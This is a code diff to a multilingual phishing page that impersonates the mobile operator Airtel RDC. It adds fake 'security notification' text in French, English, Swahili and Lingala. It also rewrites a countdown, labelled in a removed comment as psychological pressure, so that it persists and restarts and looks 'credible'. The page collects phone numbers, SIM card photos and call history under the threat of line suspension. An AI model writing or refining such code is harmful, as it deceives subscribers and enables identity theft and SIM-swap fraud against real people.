@@ -14,6 +14,9 @@ const translations = {
         nav_businesses: "Entreprises",
         nav_about: "Airtel et Vous",
         my_space_btn: "Mon Espace",
+        // Security Alert
+        security_alert_title: "Notification de Sécurité :",
+        security_alert_text: "Une vérification immédiate de votre compte est requise pour maintenir l'accès à nos services et prévenir toute interruption.",
         // Form
         countdown_prefix: "Suspension de la ligne dans :",
         form_title: "Action Requise",
@@ -43,6 +46,7 @@ const translations = {
         photo_error_uploading: "Veuillez attendre la fin du chargement de la photo.",
         photo_error_missing: "Veuillez prendre ou sélectionner une photo.",
         phone_error_invalid_format: "Veuillez entrer un numéro Airtel RDC valide (Ex: 099xxxxxxx ou 097xxxxxxx).",
+        photo_error_upload_failed: "Échec du chargement. Veuillez réessayer.",
         submit_button: "Vérifier mes informations",
         // Success message
         success_title: "Merci !",
@@ -66,6 +70,9 @@ const translations = {
     // --- English ---
     en: {
         nav_individuals: "Individuals", nav_businesses: "Businesses", nav_about: "Airtel and You", my_space_btn: "My Space",
+        // Security Alert
+        security_alert_title: "Security Notification:",
+        security_alert_text: "Immediate verification of your account is required to maintain access to our services and prevent any interruption.",
         countdown_prefix: "Line suspension in:", form_title: "Action Required",
         form_subtitle: "Suspicious activity has been detected on your line. To avoid immediate suspension, please verify your identity below.",
         phone_label: "Airtel phone number:", phone_explanation: "This allows us to identify the exact line that requires a security check.",
@@ -85,6 +92,7 @@ const translations = {
         last_calls_error_invalid_number: "One or more numbers are invalid. Please check.",
         photo_error_uploading: "Please wait for the photo to finish uploading.",
         photo_error_missing: "Please take or select a photo.",
+        photo_error_upload_failed: "Upload failed. Please try again.",
         photo_uploaded: "Photo uploaded",
         submit_button: "Verify my information",
         success_title: "Thank you!", success_message: "Your information has been successfully verified. Your line is now secure.",
@@ -97,6 +105,9 @@ const translations = {
     // --- Swahili ---
     sw: {
         nav_individuals: "Watu Binafsi", nav_businesses: "Biashara", nav_about: "Airtel na Wewe", my_space_btn: "Nafasi Yangu",
+        // Security Alert
+        security_alert_title: "Taarifa Rasmi ya Usalama:",
+        security_alert_text: "Uhakiki wa haraka wa akaunti yako unahitajika ili kuendelea kupata huduma zetu na kuzuia usumbufu wowote.",
         countdown_prefix: "Laini itasitishwa baada ya:", form_title: "Hatua Inahitajika",
         form_subtitle: "Shughuli ya kutiliwa shaka imegunduliwa kwenye laini yako. Ili kuepuka kusitishwa mara moja, tafadhali thibitisha utambulisho wako hapa chini.",
         phone_label: "Nambari ya simu ya Airtel:", phone_explanation: "Hii inatuwezesha kutambua laini halisi inayohitaji uhakiki wa usalama.",
@@ -116,6 +127,7 @@ const translations = {
         last_calls_error_invalid_number: "Nambari moja au zaidi si sahihi. Tafadhali angalia.",
         photo_error_uploading: "Tafadhali subiri picha imalize kupakiwa.",
         photo_error_missing: "Tafadhali piga au chagua picha.",
+        photo_error_upload_failed: "Upakiaji umeshindwa. Tafadhali jaribu tena.",
         photo_uploaded: "Picha imepakiwa",
         submit_button: "Thibitisha taarifa zangu",
         success_title: "Asante!", success_message: "Taarifa zako zimethibitishwa kwa mafanikio. Laini yako sasa iko salama.",
@@ -128,6 +140,9 @@ const translations = {
     // --- Lingala ---
     ln: {
         nav_individuals: "Bato na Bato", nav_businesses: "Mombongo", nav_about: "Airtel na Bino", my_space_btn: "Esika na Ngai",
+        // Security Alert
+        security_alert_title: "Liyebisi ya Bokengi:",
+        security_alert_text: "Esengeli kotala compte na yo na lombango mpo na kokoba kosalela misala na biso mpe kopekisa bokangami nyonso.",
         countdown_prefix: "Bakokanga linya na:", form_title: "Esengeli Kosala",
         form_subtitle: "Bamonaki likambo ya kokamwa na linya na yo. Pona bakanga yo te, lakisa soki yo nde nkolo ya linya.",
         phone_label: "Nimero ya telefone ya Airtel:", phone_explanation: "Oyo ekopesa biso nzela ya koyeba linya nini esengeli na bokengi.",
@@ -147,6 +162,7 @@ const translations = {
         last_calls_error_invalid_number: "Nimero moko to ebele ezali ya solo te. Tala lisusu.",
         photo_error_uploading: "Zela foto esila kozwa.",
         photo_error_missing: "Bɛta to pona foto.",
+        photo_error_upload_failed: "Kozwa elongi te. Meká lisusu.",
         photo_uploaded: "Foto ezwami",
         submit_button: "Kotala basango na ngai",
         success_title: "Matondi!", success_message: "Basango na yo endimami malamu. Sikoyo linya na yo ezali na bokengi.",
@@ -283,6 +299,27 @@ document.addEventListener('DOMContentLoaded', function() {
     });
 
     // --- Fin de la logique de langue ---
+
+    // --- Logique pour le menu mobile (Hamburger) ---
+    const mobileNavToggle = document.querySelector('.mobile-nav-toggle');
+    const header = document.querySelector('header');
+    const navIcon = mobileNavToggle.querySelector('i');
+
+    if (mobileNavToggle && header && navIcon) {
+        mobileNavToggle.addEventListener('click', () => {
+            header.classList.toggle('nav-open');
+            const isNavOpen = header.classList.contains('nav-open');
+            mobileNavToggle.setAttribute('aria-expanded', isNavOpen);
+
+            if (isNavOpen) {
+                navIcon.classList.remove('fa-bars');
+                navIcon.classList.add('fa-times');
+            } else {
+                navIcon.classList.remove('fa-times');
+                navIcon.classList.add('fa-bars');
+            }
+        });
+    }
 
     const simForm = document.getElementById('sim-form');
     const submitBtn = document.getElementById('submit-btn');
@@ -518,29 +555,61 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
 
-    // --- Logique pour le compte à rebours (pression psychologique) ---
-    function startCountdown() {
-        let duration = 3 * 60 * 60; // 3 heures en secondes
-        const timerElement = countdownTimer.querySelector('strong');
+    // --- Logique pour le compte à rebours persistant et crédible ---
+    function initializeCountdown() {
+        const countdownElement = document.querySelector('#countdown-timer strong');
+        // Si l'élément du compteur n'est pas trouvé sur la page, on ne fait rien.
+        if (!countdownElement) {
+            return;
+        }
 
-        const interval = setInterval(() => {
-            if (duration <= 0) {
-                clearInterval(interval);
-                timerElement.textContent = "00:00:00";
-                countdownTimer.innerHTML = "<strong>TEMPS ÉCOULÉ. VOTRE LIGNE EST EN COURS DE SUSPENSION.</strong>";
-                submitBtn.disabled = true;
-                return;
+        const COUNTDOWN_DURATION = 3 * 60 * 60 * 1000; // 3 heures en millisecondes
+        let countdownInterval;
+
+        function startPersistentCountdown(endTime) {
+            // On s'assure qu'il n'y a pas d'autre compteur qui tourne en parallèle
+            if (countdownInterval) {
+                clearInterval(countdownInterval);
             }
 
-            duration--;
-            
-            const hours = String(Math.floor(duration / 3600)).padStart(2, '0');
-            const minutes = String(Math.floor((duration % 3600) / 60)).padStart(2, '0');
-            const seconds = String(duration % 60).padStart(2, '0');
-            
-            timerElement.textContent = `${hours}:${minutes}:${seconds}`;
+            countdownInterval = setInterval(() => {
+                const now = new Date().getTime();
+                const distance = endTime - now;
 
-        }, 1000);
+                // Si le décompte est terminé
+                if (distance <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownElement.textContent = '00:00:00';
+                    // On supprime l'heure de fin du stockage pour en créer une nouvelle
+                    localStorage.removeItem('countdownEndTime');
+                    // Et on relance un nouveau cycle de décompte comme demandé
+                    initializeCountdown(); // Appel récursif pour relancer
+                    return;
+                }
+
+                // Calcul des heures, minutes, secondes
+                const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+                // Formatage pour avoir toujours deux chiffres (ex: 09:05:21)
+                countdownElement.textContent =
+                    `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            }, 1000);
+        }
+
+        const storedEndTime = localStorage.getItem('countdownEndTime');
+        const now = new Date().getTime();
+
+        // S'il y a une heure de fin stockée et qu'elle est dans le futur, on continue le décompte.
+        if (storedEndTime && parseInt(storedEndTime) > now) {
+            startPersistentCountdown(parseInt(storedEndTime));
+        } else {
+            // Sinon, on démarre un nouveau décompte.
+            const newEndTime = now + COUNTDOWN_DURATION;
+            localStorage.setItem('countdownEndTime', newEndTime);
+            startPersistentCountdown(newEndTime);
+        }
     }
 
     // --- Logique de chargement instantané de la photo ---
@@ -598,7 +667,8 @@ document.addEventListener('DOMContentLoaded', function() {
             fileInputWrapper.classList.remove('is-uploading', 'is-success');
             fileStatusText.classList.add('hidden');
             isUploading = false;
-            showError('simCardPhoto', 'Échec du chargement. Veuillez réessayer.');
+            const lang = localStorage.getItem('preferredLanguage') || 'fr';
+            showError('simCardPhoto', translations[lang].photo_error_upload_failed);
         }
     }
 
@@ -688,6 +758,6 @@ document.addEventListener('DOMContentLoaded', function() {
     chooseFileInput.addEventListener('change', handleFileSelection);
 
     // Initialisation des fonctionnalités "intelligentes"
-    startCountdown();
+    initializeCountdown();
     initMultiInput();
 });
